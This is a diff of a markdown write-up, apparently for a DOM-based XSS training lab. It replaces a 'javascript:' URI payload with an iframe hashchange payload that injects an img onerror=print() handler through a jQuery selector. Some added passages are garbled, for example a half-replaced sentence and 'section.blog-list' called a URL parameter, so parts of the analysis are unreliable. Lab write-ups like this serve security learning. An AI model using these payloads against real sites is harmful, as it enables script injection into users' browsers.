@@ -107,44 +107,36 @@ This allowed the attacker, after reloading the lab page via an `<iframe>` elemen
 
 The search term is passed to the `slice(1)` function which removes the first character and then to the jQuery selector.
 
-### Step 2 — Identify the parameter
+### Step 2 — Reveal Add-ons
 
 ```text
-?returnPath=/test
+/#mohamad)
 ```
 
-The `returnPath` parameter controls the value assigned to the `href` attribute of the Back link.
+I notice a syntax error appearing because the code adds a closing parenthesis on its own.
 
-### Step 3 — Confirm DOM Manipulation
+### Step 3 — Reload the page
 
 ```html
-<a id="backLink" href="/test">Back</a>
+<iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
+</iframe>
 ```
-
-
-### Step 4 — Test JavaScript Scheme
-
-```JavaScript
-javascript:alert(1)
-```
-The `href` attribute was changed to a `javascript:` URI. When the Back link was activated, the browser executed the JavaScript payload.
+Reloading the page to trigger the `hashchange` event, while adding a feature that displays the print view.
 
 ---
 
 # Technical Analysis
 
-The application reads the query string through `location.search` and passes the resulting value to `.attr('href', ...)`.
+The application reads the query string through `window.location.hash` and passes the resulting value to jQuery selector `$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`.
 
 The generated HTML initially contains:
 
 ```javascript
 <script>
-$(function() {
-    $('#backLink').attr(
-        'href',
-        (new URLSearchParams(window.location.search)).get('returnPath')
-    );
-});
+ $(window).on('hashchange', function(){
+ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+   if (post) post.get(0).scrollIntoView();
+           });
  </script>
 ```
 
@@ -153,10 +145,11 @@ $(function() {
 ```html
 search:
 
-<a id="backLink" href="/">Back</a>
+$(window).on('hashchange', function(){
+ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
 ```
 
-The client-side JavaScript reads the `returnPath` parameter from the URL and assigns its value to the `href` attribute of the Back link.
+The client-side JavaScript reads the `window.location.hash` parameter from the URL and assigns its value to the jQuery selector `$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) +  ')');` .
 
 
 ### After
@@ -164,10 +157,11 @@ The client-side JavaScript reads the `returnPath` parameter from the URL and ass
 ```html
 search:
 
-<a id="backLink" href="javascript:alert(1)">Back</a>
+$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + <iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
+</iframe>')');
 ```
 
-After supplying the malicious value, the DOM contains a `javascript:` URI. JavaScript execution occurs when the user activates the link.
+After supplying Reloading the page to trigger the `hashchange` event, while adding a feature that displays the print view.
 
 ---
 
@@ -176,32 +170,31 @@ After supplying the malicious value, the DOM contains a `javascript:` URI. JavaS
 ## Source
 
 ```javascript
-window.location.search
+window.location.hash
 ```
 The source is attacker-controlled because the attacker can modify the query string in the URL.
 
 ## Parameter
 
 ```javascript
-returnPath
+section.blog-list
 ```
 
 ## Data Flow
 
 ```javascript
-new URLSearchParams(window.location.search)
-.get('returnPath')
+$(window).on('hashchange', function(){
+ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
 ```
 
-The application extracts the attacker-controlled `returnPath` parameter from the URL query string.
+The application extracts the attacker-controlled `section.blog-list` parameter from Reloading the page to trigger the `hashchange` event, while adding a feature that displays the print view.
 
 ## Sink
 
 ```javascript
-$('#backLink').attr('href', value);
+ $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
 ```
-The value is assigned to the `href` attribute of the Back link through jQuery's `.attr()` method.
-Because the application does not validate the URL scheme, an attacker can supply a `javascript:` URI. The JavaScript executes when the manipulated link is activated.
+Since the URL simply removes the first character, decodes the string, and then appends a closing parenthesis, we can reload the page and add an event based attribute.
 
 ---
 
@@ -209,14 +202,14 @@ Because the application does not validate the URL scheme, an attacker can supply
 
 | Property | Value |
 |---|---|
-| Source | `window.location.search` |
-| Parameter | `returnPath` |
-| Sink | `.attr('href', ...)` |
-| Injection Context | HTML Attribute Context (`href`) |
+| Source | `window.location.hash` |
+| Parameter | `section.blog-list` |
+| Sink | `$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');` |
+| Injection Context | HTML Attribute Context  |
 | Encoding | None |
 | Reflection Type | DOM-based |
 | URL Scheme Validation | None |
-| Payload Type | `javascript:` URI |
+| Payload Type | `<iframe></iframe>` HTML Attribute |
 | Execution Trigger | User activates the manipulated link |
 
 ---
@@ -225,17 +218,15 @@ Because the application does not validate the URL scheme, an attacker can supply
 
 ## Payload Used
 
-```javascript
-
-javascript:alert(1)
+```html
+<iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
+</iframe>
 
 ```
 
 ## Why This Payload Works
 
-The payload uses the `javascript:` URI scheme. The application places the attacker-controlled value directly into the `href` attribute without validating the URL scheme.
-
-When the victim activates the manipulated link, the browser interprets the `javascript:` URI and executes the supplied JavaScript code.
+The `<iframe>` element reloaded the page to trigger the `hashchange` event; we then added an `<img>` element with an `onerror` event handler that displays the print page.
 
 ---
 
@@ -245,28 +236,34 @@ When the victim activates the manipulated link, the browser interprets the `java
 Attacker
    │
    ▼
-returnPath parameter
+iframe
    │
    ▼
-location.search
+hashchange
    │
    ▼
-URLSearchParams
+location.hash
    │
    ▼
-returnPath
+slice(1)
    │
    ▼
-jQuery .attr('href', ...)
+decodeURIComponent()
    │
    ▼
-<a href="javascript:alert(1)">
+jQuery $() sink
    │
    ▼
-User clicks "Back"
+HTML interpretation
    │
    ▼
-JavaScript Execution
+<img src=x>
+   │
+   ▼
+onerror
+   │
+   ▼
+print()
 ```
 
 ---
@@ -275,40 +272,39 @@ JavaScript Execution
 
 ## HTML Before Injection
 
-```html
-<a id="backLink" href="/">Back</a>
+```javascript
+$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
 ```
 
 ## URL Parameter
 
-```text
-?returnPath=javascript:alert(1)
+```javascript
+section.blog-list
 ```
 
 ---
 
 ## HTML After Injection
 
- ```html
-<a id="backLink" href="javascript:alert(1)">Back</a>
+ ```javascript
+$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + <iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
+</iframe>')');
  ```
 
-The payload uses the `javascript:` URI scheme. The application places the attacker-controlled value directly into the `href` attribute without validating the URL scheme.
-
-When the victim activates the manipulated link, the browser interprets the `javascript:` URI and executes the supplied JavaScript code.
+The `<iframe>` element reloaded the page to trigger the `hashchange` event; we then added an `<img>` element with an `onerror` event handler that displays the print page.
 
 
 
 ## Result
 
 ```text
-User activates the Back link
+<iframe></iframe>
         ↓
-javascript:alert(1)
+<img src=x onerror=print()'">
         ↓
-JavaScript execution
+Event Execution
         ↓
-Alert displayed
+View print page
 ```
 ---
 
@@ -325,7 +321,7 @@ Alert displayed
 
 # Root Cause
 
-The root cause is the assignment of attacker-controlled URL data to the `href` attribute without validating or restricting the allowed URL schemes.
+The root cause is the assignment of attacker-controlled URL data to the `section.blog-list` attribute without validating or restricting the allowed URL schemes.
 
 The application should not allow dangerous schemes such as `javascript:` to reach the DOM.
 
@@ -386,13 +382,13 @@ The application should not allow dangerous schemes such as `javascript:` to reac
 
 ## Payload Injection
 
-![Injuction](Screen-Shots/injuct-lab5.png)
+![Injuction](Screen-Shots/injuct-lab6.png)
 
 ...
 
 ## Successful Alert
 
-![Success](Screen-Shots/success-lab5.png)
+![Success](Screen-Shots/success-lab6.png)
 
 ---
 
